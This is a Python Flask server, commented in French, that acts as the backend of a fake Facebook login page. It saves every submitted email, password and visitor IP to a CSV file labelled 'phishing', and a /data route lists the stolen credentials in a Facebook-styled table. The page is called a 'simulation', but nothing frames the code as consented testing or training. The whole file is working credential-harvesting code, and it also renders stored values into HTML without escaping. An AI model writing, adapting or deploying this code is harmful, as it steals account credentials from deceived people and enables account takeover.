# ============================================================
#   SERVEUR PYTHON - Sauvegarde des données phishing en CSV
#   Lancer avec : python server.py
#   Puis ouvrir : http://localhost:5000
# ============================================================

from flask import Flask, request, jsonify, send_from_directory
import csv
import os
from datetime import datetime

app = Flask(__name__)

# Dossier où se trouve ce fichier
BASE_DIR = os.path.dirname(os.path.abspath(__file__))
CSV_FILE = os.path.join(BASE_DIR, "data", "donnees_collectees.csv")

# Créer le dossier data si nécessaire
os.makedirs(os.path.join(BASE_DIR, "data"), exist_ok=True)

# Créer le CSV avec les en-têtes si il n'existe pas
if not os.path.exists(CSV_FILE):
    with open(CSV_FILE, "w", newline="", encoding="utf-8") as f:
        writer = csv.writer(f)
        writer.writerow(["timestamp", "email", "password", "ip", "label"])
    print(f"✅ Fichier CSV créé : {CSV_FILE}")


# ── Route principale : sert la page HTML
@app.route("/")
def index():
    return send_from_directory(BASE_DIR, "facebook_simulation.html")


# ── Route pour recevoir les données du formulaire
@app.route("/submit", methods=["POST"])
def submit():
    data = request.get_json()

    email    = data.get("email", "")
    password = data.get("password", "")
    ip       = request.remote_addr
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    # Sauvegarde dans le CSV
    with open(CSV_FILE, "a", newline="", encoding="utf-8") as f:
        writer = csv.writer(f)
        writer.writerow([timestamp, email, password, ip, "phishing"])

    print(f"📥 Nouvelle entrée : {timestamp} | {email} | IP: {ip}")

    return jsonify({"status": "ok"})


# ── Route pour voir les données collectées
@app.route("/data")
def voir_data():
    rows = []
    with open(CSV_FILE, "r", encoding="utf-8") as f:
        reader = csv.DictReader(f)
        for row in reader:
            rows.append(row)

    html = """
    <html><head>
    <title>Données collectées</title>
    <style>
      body { font-family: Arial; padding: 20px; background: #f0f2f5; }
      h2 { color: #1877f2; }
      table { border-collapse: collapse; width: 100%; background: white; border-radius: 8px; overflow: hidden; box-shadow: 0 2px 8px rgba(0,0,0,.1); }
      th { background: #1877f2; color: white; padding: 12px; text-align: left; }
      td { padding: 10px 12px; border-bottom: 1px solid #ddd; }
      tr:hover td { background: #f0f2f5; }
      .count { color: #666; margin-bottom: 16px; }
    </style>
    </head><body>
    <h2>📊 Données collectées</h2>
    """
    html += f'<p class="count">Total : <strong>{len(rows)}</strong> entrées</p>'
    if rows:
        html += "<table><tr>"
        for key in rows[0].keys():
            html += f"<th>{key}</th>"
        html += "</tr>"
        for row in rows:
            html += "<tr>"
            for val in row.values():
                html += f"<td>{val}</td>"
            html += "</tr>"
        html += "</table>"
    else:
        html += "<p>Aucune donnée encore.</p>"
    html += "</body></html>"
    return html


if __name__ == "__main__":
    print("=" * 50)
    print("🚀 Serveur démarré !")
    print("📄 Page Facebook : http://localhost:5000")
    print("📊 Voir données  : http://localhost:5000/data")
    print("📁 CSV sauvegardé dans : data/donnees_collectees.csv")
    print("=" * 50)
    app.run(debug=True, port=5000)
